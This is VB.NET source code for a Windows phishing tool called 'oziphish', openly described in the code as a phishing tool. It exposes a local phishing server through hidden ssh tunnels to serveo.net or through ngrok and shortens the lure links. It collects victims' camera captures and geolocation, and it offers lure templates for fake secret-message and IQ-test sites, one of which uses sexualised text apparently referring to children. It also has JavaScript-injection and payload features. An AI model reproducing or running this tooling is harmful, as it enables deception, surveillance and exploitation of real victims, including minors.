    Private Sub Form1_MouseMove(sender As Object, e As MouseEventArgs) Handles Guna2ShadowPanel2.MouseMove
        If isDragging Then
            Dim newLocation As New Point(Me.Left + e.X - clickPoint.X, Me.Top + e.Y - clickPoint.Y)
            Me.Location = newLocation
        End If
    End Sub

    Private Sub Form1_MouseUp(sender As Object, e As MouseEventArgs) Handles Guna2ShadowPanel2.MouseUp
        If e.Button = MouseButtons.Left Then
            isDragging = False
        End If
    End Sub
    Dim currentForm As Form

    Private Sub LoadFormIntoPanel(formToShow As Form, panelToLoadInto As Panel)
        If currentForm IsNot Nothing Then
            currentForm.Close()
        End If

        currentForm = formToShow
        currentForm.TopLevel = False
        currentForm.FormBorderStyle = FormBorderStyle.None
        currentForm.Dock = DockStyle.Fill
        panelToLoadInto.Controls.Add(currentForm)
        currentForm.Show()
    End Sub

    Private Sub ResetButtonColors()

    End Sub
    Private costom As Boolean = False
    Private Sub DrakeUIRadioButton2_ValueChanged(sender As Object, value As Boolean) Handles DrakeUIRadioButton2.ValueChanged
        If DrakeUIRadioButton2.Checked Then
            Guna2Button4.Visible = False
            GunaComboBox1.Visible = True
            Label6.Visible = False
            costom = False
        End If
    End Sub
    Private dr As Integer = 0
    Private Sub GunaComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles GunaComboBox1.SelectedIndexChanged
        dr = GunaComboBox1.SelectedIndex()

    End Sub

    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
        Try
            loadimg()
            LoadData()
        Catch ex As Exception
            DrakeUITextBox1.AppendText(vbNewLine + ex.ToString())
        End Try
    End Sub
    Private Sub loadimg()
        Dim dataGridView As DataGridView = Guna2DataGridView1

        ' Assuming the directory path where images are located
        Dim imagePath As String = f + "\captAXE"
        If Directory.Exists(imagePath) Then
            ' Get all PNG files in the directory
            Dim imageFiles As String() = Directory.GetFiles(imagePath, "*.png")
            For Each pngFile As String In imageFiles
                ' Extract the file name without extension
                Dim fileName As String = Path.GetFileNameWithoutExtension(pngFile)

                ' Check if a row with the same name already exists
                Dim existingRow As DataGridViewRow = dataGridView.Rows.Cast(Of DataGridViewRow)().FirstOrDefault(
                Function(row) Convert.ToString(row.Cells("column10").Value) = fileName)

                ' If the row doesn't exist, add a new row
                If existingRow Is Nothing Then
                    Dim originalImage As Image = Image.FromFile(pngFile)
                    Dim resizedImage As New Bitmap(originalImage, New Size(600, 300))
                    dataGridView.Rows.Add(fileName, resizedImage)


                End If
            Next

        End If
    End Sub
    Private Async Sub DrakeUIDataGridView2_CellClick(sender As Object, e As DataGridViewCellEventArgs) Handles DrakeUIDataGridView3.CellClick
        ' Check if the clicked cell is in the specific column you are interested in
        If e.ColumnIndex = 3 Then
            ' Access the content of the clicked cell in the specific row
            Dim clickedCellContent As String = Convert.ToString(DrakeUIDataGridView3.Rows(e.RowIndex).Cells(e.ColumnIndex).Value)

            Dim coordinates As String() = clickedCellContent.Split("\"c)

            ' Check if the split resulted in two values
            If coordinates.Length = 2 Then
                ' Store the values in separate variables
                Dim firstValue As String = coordinates(0).Trim()
                Dim secondValue As String = coordinates(1).Trim()

                ' Now, you can use the firstValue and secondValue variables as needed
                MsgBox("GEO IÜ: " & vbCrLf & firstValue & " " & secondValue)
                Try
                    WebBrowser1.Stop()
                Catch ex As Exception

                End Try
                WebBrowser1.Navigate($"https://www.latlong.net/c/?lat={firstValue}&long={secondValue}")
                Await Task.Delay(3000)
                AddHandler WebBrowser1.DocumentCompleted, AddressOf WebBrowser1_DocumentCompleted
            Else

            End If
        End If
    End Sub
    Private Sub WebBrowser1_DocumentCompleted(sender As Object, e As WebBrowserDocumentCompletedEventArgs)
        ' Inject JavaScript code to manipulate the DOM after the page is loaded
        Dim script As String = "var element = document.getElementById('latlongmap'); " &
                               "if (element) { " &
                               "  element.scrollIntoView(); " &
                               "} else { " &
                               "  alert('Element with ID latlongmap not found.'); " &
                               "}"

        ' Execute the script
        WebBrowser1.Document.InvokeScript("execScript", New Object() {script, "JavaScript"})
    End Sub
    Private Sub MakeSlightlyRoundForm(radius As Integer)
        ' Create a GraphicsPath to define the shape of the form (rounded rectangle in this case)
        Dim path As New System.Drawing.Drawing2D.GraphicsPath()
        path.AddLine(radius, 0, Me.Width - radius, 0)
        path.AddArc(Me.Width - radius, 0, radius, radius, 270, 90)
        path.AddLine(Me.Width, radius, Me.Width, Me.Height - radius)
        path.AddArc(Me.Width - radius, Me.Height - radius, radius, radius, 0, 90)
        path.AddLine(Me.Width - radius, Me.Height, radius, Me.Height)
        path.AddArc(0, Me.Height - radius, radius, radius, 90, 90)
        path.AddLine(0, Me.Height - radius, 0, radius)
        path.AddArc(0, 0, radius, radius, 180, 90)

        ' Set the Region property of the form to the created GraphicsPath
        Me.Region = New Region(path)

    End Sub
    Private Async Sub TabControl1_SelectedIndexChangedAsync(sender As Object, e As EventArgs) Handles DrakeUITabControlMenu2.SelectedIndexChanged
        ' Check which tab is currently selected
        Select Case DrakeUITabControlMenu2.SelectedIndex
            Case 0, 1, 2, 3, 4, 5, 6, 7, 8, 9
                ' Code to execute when the first tab is selected
                Try
                    Label1.Text = " "
                    wavePlayer?.Stop()
                    wavePlayer?.Dispose()
                    waveStream?.Dispose()
                Catch ex As Exception

                End Try

            ' Add more cases for other tabs as needed
            Case 10
                ' Code to execute when the second tab is selected
                Dim audioFile As New WaveFileReader(My.Resources.krz)
                waveStream = audioFile

                wavePlayer = New WaveOutEvent()
                wavePlayer.Init(waveStream)


                wavePlayer.Play()



                originalLocation = Me.Location



                Dim duration As Integer = 5000

                Dim timer As New System.Windows.Forms.Timer()

                timer.Interval = 30

                timer.Start()
                Timer5.Start()

                Dim thread As New Thread(
                    Sub()
                        Dim startTime As DateTime = DateTime.Now


                        While (DateTime.Now - startTime).TotalMilliseconds < duration
                            Me.Invoke(
                                Sub()

                                    Me.Location = New Point(
                                        originalLocation.X + random.Next(-10, 10),
                                        originalLocation.Y + random.Next(-10, 10)
                                    )
                                End Sub
                            )


                            Thread.Sleep(20)
                        End While


                        timer.Stop()

                        Me.Invoke(
                            Sub()
                                Me.Location = originalLocation

                                Guna2ImageButton2.Enabled = True
                            End Sub
                        )
                    End Sub
                )


                thread.Start()
                Await Task.Delay(5500)
                Dim pstep As Boolean = True
                Dim loader As String = "Most powerfull tool Made by Oziris " + vbNewLine + "t.me/OZIRIS_Softs" + vbNewLine + "For personal or educational purposes only" + vbNewLine + "the developer is not responsible for any misuse or illegal purposes" + vbNewLine + vbNewLine + vbNewLine + "FIX YOUR ACCENT BEFORE SCAMMING PEOPLES !!!"
                Dim x As Integer = 0
                Dim thread1 As New Threading.Thread(
                           Sub()




                               While pstep
                                   Me.Invoke(
                                       Sub()
                                           If x <= loader.Length() Then
                                               Label1.Text = loader.Substring(0, x)
                                               x = x + 1
                                           Else
                                               pstep = False
                                           End If

                                       End Sub
                                   )


                                   Thread.Sleep(80)
                               End While



                           End Sub
                       )


                thread1.Start()
        End Select
    End Sub

    Private TargetText2 As String = "Most powerfull phishing  Tool" +
        vbNewLine +
        "By O Z I R I S" +
        vbNewLine + "Thanks to DRAGO for doing the server backend and frontend (php stuffs and design)" + vbNewLine + "oziphish is created to help in penetration testing and its not responsible for any misuse or illegal purposes"
    Private count As Integer = 0
    Private count2 As Integer = 0


    Dim sshProcess As Process

    Private Async Sub RunCommandAndCaptureOutput()
        Dim yourCommand As String = $"-R 80:localhost:{MetroSetNumeric1.Value.ToString()} serveo.net"
        Try
            Dim cmm As String = "ssh.exe"


            Dim processInfo As New ProcessStartInfo(cmm, yourCommand)
            processInfo.CreateNoWindow = True
            processInfo.RedirectStandardOutput = True
            processInfo.RedirectStandardError = True
            processInfo.UseShellExecute = False
            processInfo.WindowStyle = ProcessWindowStyle.Hidden
            Dim sshProcess As New Process()
            sshProcess.StartInfo = processInfo
            AddHandler sshProcess.OutputDataReceived, Sub(sender, e) AppendTextToTextBox22(e.Data)
            AddHandler sshProcess.ErrorDataReceived, Sub(sender, e) AppendTextToTextBox22(e.Data)
            sshProcess.Start()
            DrakeUILampLED3.On = True
            sshProcess.BeginOutputReadLine()
            sshProcess.BeginErrorReadLine()
            Await Task.Run(Sub() sshProcess.WaitForExit())
            sshProcess.Close()
        Catch ex As Exception
            MetroSetTextBox2.Text = "Error retrieving public url"
        End Try
    End Sub
    Public isLinkCaptured As Boolean = False

    Private Sub AppendTextToTextBox22(text As String)
        If isLinkCaptured = False AndAlso Not String.IsNullOrEmpty(text) Then
            ' Use a regular expression to find the link in the output
            Dim linkRegex As New Regex("https://[a-zA-Z0-9\.]+\.serveo\.net")
            Dim match As Match = linkRegex.Match(text)

            ' Check if a match is found
            If match.Success Then
                ' Update your TextBox with the captured link
                MetroSetTextBox2.Text = match.Value
                DrakeUILampLED3.On = True
                isLinkCaptured = True
            End If
        End If
    End Sub

    Private Sub Guna2CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles Guna2CheckBox1.CheckedChanged

    End Sub
    Public ngrokstrg As String = "config add-authtoken "
    Private Sub Guna2GradientButton1_Click(sender As Object, e As EventArgs) Handles Guna2Button1.Click

        Dim StatusDate As String

        StatusDate = Guna2TextBox3.Text()

        If StatusDate.IsNullOrEmpty(StatusDate.Trim()) Then
            ' Display an error message
            MessageBox.Show("You must enter a valid authtoken to continue.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)









        Else
Error_Expected:
            Try
                Dim yamlContent As String = $"version: ""2""" & vbCrLf & $"authtoken: {StatusDate}"

                Dim appDataPath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
                Dim lastdir As String = appDataPath.ToString() + "\ngrok"


                Try
                    If Not Directory.Exists(lastdir) Then
                        Directory.CreateDirectory(lastdir)
                    Else
                        Directory.Delete(lastdir, True)
                    End If

                Catch ex As Exception

                End Try

                Dim filePath As String = lastdir + "\ngrok.yml"


                File.WriteAllText(filePath, yamlContent)
            Catch ex As Exception
                GoTo Error_Expected
            End Try


            My.Settings.ngrokex = StatusDate
            My.Settings.Save()
        End If
        Application.Restart()


    End Sub



    Private Sub DrakeUICheckBox13_ValueChanged(sender As Object, value As Boolean) Handles DrakeUICheckBox13.ValueChanged
        If DrakeUICheckBox13.Checked = True Then
            My.Settings.sounds = True
            My.Settings.Save()
        Else
            My.Settings.sounds = False
            My.Settings.Save()
        End If
    End Sub
    Private Function ImagesAreEqual(image1 As Image, image2 As Image) As Boolean
        ' Convert images to Bitmap
        Dim bitmap1 As New Bitmap(image1)
        Dim bitmap2 As New Bitmap(image2)

        For x As Integer = 0 To bitmap1.Width - 1
            For y As Integer = 0 To bitmap1.Height - 1
                If bitmap1.GetPixel(x, y) <> bitmap2.GetPixel(x, y) Then
                    Return False
                End If
            Next
        Next

        Return True
    End Function
    Private Function ImageExistsInDataGridView(image As Image, dataGridView As DataGridView) As Boolean
        ' Check if the image is already present in the "photos" column
        For Each row As DataGridViewRow In dataGridView.Rows
            If TypeOf row.Cells("Column9").Value Is Image Then
                Dim existingImage As Image = DirectCast(row.Cells("Column9").Value, Image)

                ' Compare images pixel by pixel
                If ImagesAreEqual(image, existingImage) Then
                    Return True
                End If
            End If
        Next

        Return False
    End Function
    Private uploadCounter As PerformanceCounter
    Private downloadCounter As PerformanceCounter


    Private Sub timerUpdate_Tick(sender As Object, e As EventArgs) Handles timerUpdate.Tick

        Dim uploadSpeed As Single = uploadCounter.NextValue()
        Dim downloadSpeed As Single = downloadCounter.NextValue()


        LabelUpload.Text = $"Upload: {uploadSpeed / 1024:F2} KB/s"
        LabelDownload.Text = $"Download: {downloadSpeed / 1024:F2} KB/s"
    End Sub
    Private Async Sub Button1_Click(send As String)
        ' URL to perform GET request
        Dim apiUrl As String = $"https://ulvis.net/api.php?url={send}"

        ' Create HttpClient instance
        Using httpClient As New HttpClient()
            Try
                ' Perform GET request and get response
                Dim response As HttpResponseMessage = Await httpClient.GetAsync(apiUrl)

                ' Check if the request was successful
                If response.IsSuccessStatusCode Then
                    ' Read the content of the response
                    Dim responseBody As String = Await response.Content.ReadAsStringAsync()

                    ' Display the response in TextBox
                    MetroSetTextBox5.Text = responseBody
                Else
                    ' Handle unsuccessful response (e.g., display an error message)
                    MetroSetTextBox5.Text = "Error: " & response.StatusCode.ToString()
                End If
            Catch ex As Exception
                ' Handle exceptions (e.g., network errors)
                MetroSetTextBox5.Text = "Error: " & ex.Message
            End Try
        End Using
    End Sub

    Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox1.SelectedIndexChanged
        If ComboBox1.SelectedIndex = 1 Then
            If MetroSetTextBox1.Text.Length > 0 Then
                Button1_Click(MetroSetTextBox1.Text())
            End If

        Else
            If MetroSetTextBox2.Text.Length() > 0 Then
                Button1_Click(MetroSetTextBox2.Text())
            End If

        End If
    End Sub

    Function GetPublicIPAddressAsync()
        Dim ipAddress As String = ""

        Try
            ' Make a request to the ipify.org service using HttpClient
            Using client As New WebClient()

                Dim response As String = client.DownloadString("https://api64.ipify.org/")

                ' Parse the JSON response to get the IP address
                ipAddress = response
            End Using
        Catch ex As Exception
            ' Handle any errors, e.g., network issues or service unavailability
            ipAddress = "Error getting IP address"
        End Try

        Return ipAddress
    End Function

    Private Sub Guna2Button3_Click(sender As Object, e As EventArgs) Handles Guna2Button3.Click
        GetIPInfoAndDisplayAsync()
    End Sub

    Sub GetIPInfoAndDisplayAsync()
        Dim ipAddress As String = GetPublicIPAddressAsync()
        If ipAddress = "Error getting IP address" Then
            LabelUpload.Text = ipAddress
            Exit Sub
        End If

        Try
            ' Make a request to the ip-api.com service using HttpClient
            Using client As New WebClient()
                Dim apiUrl As String = $"http://ip-api.com/json/{ipAddress}?fields=query,country,countryCode,city,isp,proxy"
                Dim response As String = client.DownloadString(apiUrl)

                ' Parse the JSON response to get IP information
                Dim jsons As JObject = JObject.Parse(response)

                LabelUpload.Text = $"{jsons("query")}"

                If jsons("proxy").ToString().ToLower() = "false" Then
                    Label4.Text = "Warning: You Are not Using A VPN Or a Tor Network" + vbNewLine + "please hide yourself"
                    Label5.Text = $"You're from {jsons("country")}, {jsons("city")}" + vbNewLine + $"And your ISP is {jsons("isp")}"
                    Label5.ForeColor = Color.Red
                    Label4.ForeColor = Color.Red

                Else
                    Label4.Text = "Warning: You Are now Using A VPN Or a Tor Network" + vbNewLine + "You're hidden"
                    Label5.Text = $"You're from {jsons("country")}, {jsons("city")}" + vbNewLine + $"And your ISP is {jsons("isp")}"
                    Label5.ForeColor = Color.FromArgb(0, 64, 0)
                    Label4.ForeColor = Color.FromArgb(0, 64, 0)

                End If

                Try
                    If Directory.Exists(pth) Then
                        Dim files As String() = Directory.GetFiles(pth, "*.ico")
                        Dim icon As Image = Nothing

                        For Each filel As String In files
                            Dim countryName As String = Path.GetFileNameWithoutExtension(filel)

                            ' Check if the country code matches the data in JSON
                            If jsons("countryCode").ToString() = countryName Then
                                ' Add the data to the DataGridView
                                icon = New Bitmap(Image.FromFile(filel), New Size(55, 40))
                                Guna2PictureBox1.Image = icon
                                Exit For
                            End If
                        Next

                        If icon Is Nothing Then
                            Dim iconss As New Bitmap(Image.FromFile(pth + "\_nato.ico"))
                            Guna2PictureBox1.Image = iconss
                        End If
                    End If
                Catch ex As Exception
                End Try
            End Using
        Catch ex As Exception
            ' Handle any errors, e.g., network issues or service unavailability
            Console.WriteLine($"Error getting IP information: {ex.Message}")
        End Try
    End Sub

    Private Sub TabPage6_Click(sender As Object, e As EventArgs) Handles TabPage6.Click

    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs)
        jsinject.Show()
    End Sub

    Private Sub Guna2CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles Guna2CheckBox2.CheckedChanged
        If Guna2CheckBox2.Checked Then
            jsinject.Show()


        End If
    End Sub

    Private Sub DrakeUIRadioButton1_ValueChanged(sender As Object, value As Boolean) Handles DrakeUIRadioButton1.ValueChanged
        If DrakeUIRadioButton1.Checked Then
            Guna2Button4.Visible = True
            GunaComboBox1.Visible = False
            Label6.Visible = True
            costom = True
        End If
    End Sub

    Private Sub Guna2Button4_Click(sender As Object, e As EventArgs) Handles Guna2Button4.Click
        Dim folderBrowserDialog As New FolderBrowserDialog()

        If folderBrowserDialog.ShowDialog() = DialogResult.OK Then
            Label6.Text = folderBrowserDialog.SelectedPath
            costomPath = folderBrowserDialog.SelectedPath
            Label6.ForeColor = Color.Lime
            My.Settings.indexfolder = costomPath
        Else
            Label6.Text = "php server folder should be selected"
            Label6.ForeColor = Color.Red
            costomPath = String.Empty
        End If
    End Sub

    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click

    End Sub

    Private Sub Guna2ShadowPanel2_Paint(sender As Object, e As PaintEventArgs) Handles Guna2ShadowPanel2.Paint

    End Sub

    Private Async Sub Guna2Button5_Click(sender As Object, e As EventArgs) Handles Guna2Button5.Click

        Dim pathstrg As String() = {"\resources\tsweb\sarahahen",
            "\resources\tsweb\iqen",
            "\resources\tsweb\iqAR",
            ""
        }
        My.Settings.indexPath = pathstrg(GunaComboBox1.SelectedIndex)
        Dim params0 As String() = {"Get anonymous feedback from your friends, coworkers and Fans. Secret Messages are fun!",
            "Send secret message to your friends via 🔒 Secret Messages 2024 😍 || StoryZink.com",
            "🔒 Secret Messages 2024 😍 || StoryZink.com",
            "http://StoryZink.com",
            "Send a secret message to your friend, have fun. Create your link and get secret messages. Click here!",
            Application.StartupPath + "\resources\tsweb\sarahahen\logo.jpg"}
        Dim params1 As String() = {" Take the IQ Test and discover your IQ today",
            " Take the IQ Test and discover your IQ today",
            "IQ test Today",
            "http://iqtest.com",
            "Click here now !!",
            Application.StartupPath + "\resources\tsweb\iqen\logo.jpg"
            }
        Dim params2 As String() = {"اختبار IQ الدولي الرسمي من 40 سؤالا. تحقق نتائج بحثك",
            "اختبار الذكاء عبر الإنترنت - تقييم دقيق للدرجة الذكائية — IQ test online",
            "اختبار IQ الدولي الرسمي من 40 سؤالا. تحقق نتائج بحثك",
            "https://iq-global-test.com",
            "IQ test platform",
            Application.StartupPath + "\resources\tsweb\iqAR\logo.jpg"
        }
        Dim params3 As String() = {"اختبار الذكاء عبر الإنترنت - تقييم دقيق للدرجة الذكائية — IQ test online",
            "اختبار الذكاء عبر الإنترنت - تقييم دقيق للدرجة الذكائية — IQ test online",
            "ملايين المستخدمين، شارك حسابك وابدأ بتلقي ال",
            "http://saraahah.com",
            "Samira - صراحة",
            Application.StartupPath + "\resources\tsweb\sarahahv1\logo.jpg"
        }
        Dim params4 As String() = {"ارسل لي رسالة سرية دون أن أعرف من انت , انقر هنا وادخل الصندوق السري الخاص بي , كن صادقاُ معي",
            "ارسل لي رسالة سرية دون أن أعرف من انت ",
            "صارحني برسالة سرية Samira moalla",
            "https://www.sarhne.com",
            "صارحني برسالة سرية",
            Application.StartupPath + "\resources\tsweb\sarahahv2\logo.jpg"
        }
        Dim params5 As String() = {" 15 वीडियो और 60 फोटो, सेक्सी लड़की 18",
            " 15 वीडियो और 60 फोटो, सेक्सी लड़की 18",
            "15 वीडियो और 60 फोटो, सेक्सी लड़की 18",
            "https://www.soopsoop.ca",
            "Pakistani and indian ki#ds sex ",
            Application.StartupPath + "\resources\tsweb\sexmag\logo.jpg"
        }
        Dim costomprm As String() = {" ",
            " ",
            " ",
            " ",
            " ",
            selectedpath + "\logo.jpg"
        }






        Dim allprm As Array = {params0, params1, params2, params3, params4, params5}
        If costom Then
            If My.Settings.indexfolder IsNot String.Empty Then
                launchform(costomprm)
            Else
                Label6.Text = "a path should be selected"
                Label6.ForeColor = Color.Red
                Await Task.Delay(2000)
                Label6.Text = "PATH"
                Label6.ForeColor = Color.Green
            End If


        Else
            launchform(allprm(GunaComboBox1.SelectedIndex()))
        End If
    End Sub
    Private Sub launchform(param As String())

        Dim medit As New Metainf
        medit.TextBox1.Text = param(0)
        medit.TextBox2.Text = param(2)
        medit.TextBox3.Text = param(3)
        medit.TextBox4.Text = param(1)
        medit.TextBox5.Text = param(4)
        If IO.File.Exists(param(5)) Then
            medit.PictureBox1.Image = Image.FromFile(param(5))
            medit.Show()
        Else
            medit.PictureBox1.Image = My.Resources.nfound
            medit.Show()
        End If
    End Sub

    Private Sub Guna2CheckBox4_CheckedChanged(sender As Object, e As EventArgs) Handles Guna2CheckBox4.CheckedChanged
        If Guna2CheckBox4.Checked Then
            Dim pyld As New pyloadRP()
            pyld.Show()
        End If
    End Sub
End Class